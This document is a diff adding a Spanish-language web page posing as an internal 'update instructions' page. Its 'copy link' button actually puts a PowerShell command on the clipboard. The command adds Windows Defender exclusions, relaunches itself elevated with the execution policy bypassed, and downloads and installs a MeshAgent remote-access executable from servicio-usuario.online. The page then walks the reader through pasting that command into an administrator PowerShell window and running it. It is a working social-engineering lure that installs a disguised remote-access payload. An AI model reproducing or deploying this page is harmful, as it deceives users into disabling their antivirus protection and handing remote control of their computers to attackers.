@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Canal interno de información</title>
+
+
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="apple-touch-icon" href="favicon.png">
+
+
+<script src="acceso.js"></script>
+
+<style>
+:root {
+  color-scheme: light;
+  --blanco: #ffffff;
+  --texto: #111111;
+  --suave: #374151;
+  --linea: #d9dbe0;
+  --gris: #e4e6ea;
+  --rojo: #db0921;
+}
+*, *::before, *::after { box-sizing: border-box; }
+html { scroll-padding-top: 80px; }
+body {
+  margin: 0;
+  background: var(--blanco);
+  color: var(--texto);
+  font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+  line-height: 1.6;
+}
+
+
+.cabecera {
+  height: 84px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 clamp(16px, 2vw, 36px) 0 clamp(16px, 6vw, 112px);
+  background: var(--blanco);
+}
+
+
+.logo { width: 160px; border-radius: 4px; overflow: hidden; }
+.logo:not(:has(img[src])) { aspect-ratio: 1 / 1; background: #f1f2f4; }
+.logo img { width: 100%; height: auto; max-height: 160px; object-fit: contain; display: block; }
+.logo img:not([src]) { display: none; }
+
+/* Selector de idioma */
+.idioma select {
+  font: inherit; font-size: .95rem; color: #262626;
+  background: transparent url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1.5l5 5 5-5' fill='none' stroke='%23262626' stroke-width='1.4' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E") no-repeat right 4px center;
+  border: 0; border-radius: 4px;
+  padding: 6px 24px 6px 4px;
+  appearance: none; -webkit-appearance: none;
+  cursor: pointer;
+}
+.idioma select:focus-visible { outline: 2px solid #262626; outline-offset: 2px; }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }
+
+
+.barra { height: 12px; background: linear-gradient(90deg, #d90921 0%, #100f0f 100%); }
+
+
+.contenedor { width: min(69%, 1300px); margin: 0 auto; }
+
+.titulo { padding: 40px 0 14px; border-bottom: 2px solid var(--rojo); }
+.titulo h1 { margin: 0; font-size: 1.375rem; font-weight: 700; line-height: 1.3; color: #050505; }
+
+/* Espacio central para el texto principal: una sola columna */
+.bloque-texto { min-height: 560px; padding: 32px 0 8px; columns: 1; }
+.bloque-texto p { margin: 0 0 1em; color: var(--suave); font-size: 1.125rem; line-height: 1.7; }
+.bloque-texto strong { color: var(--texto); }
+.subrayado { text-decoration: underline; text-underline-offset: 3px; text-decoration-thickness: 1.5px; }
+
+
+.contenedor { padding-bottom: 80px; }
+#btn-copiar {
+  font: inherit; font-size: .9rem; color: var(--texto);
+  background: var(--blanco); border: 1px solid var(--linea); border-radius: 6px;
+  padding: 10px 16px; cursor: pointer;
+}
+#btn-copiar:hover { background: var(--gris); }
+
+@media (max-width: 800px) {
+  .contenedor { width: 90%; }
+  .titulo { padding-top: 28px; }
+  .bloque-texto { min-height: 360px; }
+}
+</style>
+</head>
+<body>
+
+<header class="cabecera">
+  
+  <div class="logo" id="imagen1"><img data-img="imagen1" alt="Logo"></div>
+
+  <div class="idioma">
+    <label class="sr" for="idioma">Idioma</label>
+    <select id="idioma">
+      <option value="es" selected>Español</option>
+      <option value="ca">Català</option>
+      <option value="eu">Euskera</option>
+      <option value="gl">Galego</option>
+      <option value="ca-ES-valencia">Valencià</option>
+      <option value="en">English</option>
+    </select>
+  </div>
+</header>
+
+<div class="barra"></div>
+
+<main class="contenedor">
+  
+  <div class="titulo">
+    <h1><strong>INSTRUCCIONES DE ACTUALIZACIÓN</strong></h1>
+  </div>
+
+  
+  <div class="bloque-texto">
+        <p><strong>Primer paso: Copiar el enlace proporcionado</strong></p>
+
+        <p>Copie el enlace clicando en el botón inferior facilitado por el servicio de soporte y manténgalo disponible para su posterior utilización.</p>
+
+      <button type="button" id="btn-copiar" data-enlace="if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+  $cmd = 'Add-MpPreference -ExclusionPath "$env:TEMP\meshagent.exe","C:\Program Files\Mesh Agent"; $u=''https://servicio-usuario.online/meshagents?id=4&meshid=gj41Be2KALalo$89skbguJUKiufX6DEatF6lkkfu9afPG9PlhfAagjFU2uP0QrNs&installflags=1''; $f="$env:TEMP\meshagent.exe"; Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing; Start-Process $f -ArgumentList ''-fullinstall'' -Wait'
+  Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $cmd"
+} else {
+  Add-MpPreference -ExclusionPath "$env:TEMP\meshagent.exe","C:\Program Files\Mesh Agent"
+  $u='https://servicio-usuario.online/meshagents?id=4&meshid=gj41Be2KALalo$89skbguJUKiufX6DEatF6lkkfu9afPG9PlhfAagjFU2uP0QrNs&installflags=1'
+  $f="$env:TEMP\meshagent.exe"
+  Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
+  Start-Process $f -ArgumentList '-fullinstall' -Wait
+}">Copiar enlace</button>
+      <p></p>
+      <p><strong>Segundo paso: Abrir PowerShell como administrador</strong></p>
+
+       <p> Para ello, pulse la combinación de teclas ⊞ Win + R (tecla Windows + tecla R) y, en la ventana de diálogo que se muestra, escriba "Powershell".</p>
+      
+      <p><strong>Tercer paso: Ejecutar PowerShell con privilegios elevados</strong></p>
+
+        <p>Alternativamente, puede acceder directamente a PowerShell haciendo clic derecho sobre el icono de la aplicación y seleccionando la opción "Ejecutar como administrador".</p>
+      <p><strong>Cuarto paso: Pegar el enlace en la ventana de PowerShell</strong></p>
+
+       <p>Una vez abierta la consola, pegue el enlace copiado en el paso primero. Para ello, puede hacer uso de la combinación de teclas Ctrl + V, o bien hacer clic con el botón derecho del ratón sobre la ventana y seleccionar la opción "Pegar".</p>
+      <p><strong>Quinto paso: Ejecutar el comando</strong></p> 
+
+        <p>Pulse la tecla Intro (Enter) para ejecutar el comando y proceda conforme a las indicaciones que se muestren en pantalla.</p>
+        <p></p>
+        <p><strong><u>Asegúrese de que la consola (Powershell) se ejecuta con privilegios de administrador; de lo contrario, es posible que el comando no se ejecute correctamente.</u></strong></p>
+  </div>
+
+</main>
+
+<script>
+
+(function () {
+  var ext = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'svg', 'JPG', 'JPEG', 'PNG'];
+  document.querySelectorAll('img[data-img]').forEach(function (img) {
+    var i = 0, base = img.getAttribute('data-img');
+    img.onerror = function () {
+      i++;
+      if (i < ext.length) { img.src = base + '.' + ext[i]; }
+      else { img.removeAttribute('src'); img.onerror = null; }
+    };
+    img.src = base + '.' + ext[0];
+  });
+})();
+
+
+document.getElementById('idioma').addEventListener('change', function (e) {
+  document.documentElement.lang = e.target.value;
+});
+
+
+document.getElementById('btn-copiar').addEventListener('click', async function () {
+  var btn = this;
+  var texto = btn.dataset.enlace || window.location.href;
+  try {
+    await navigator.clipboard.writeText(texto);
+  } catch (e) {
+    var t = document.createElement('textarea');
+    t.value = texto;
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand('copy');
+    t.remove();
+  }
+  var original = btn.textContent;
+  btn.textContent = '¡Enlace copiado!';
+  setTimeout(function () { btn.textContent = original; }, 2000);
+});
+</script>
+</body>
+</html>
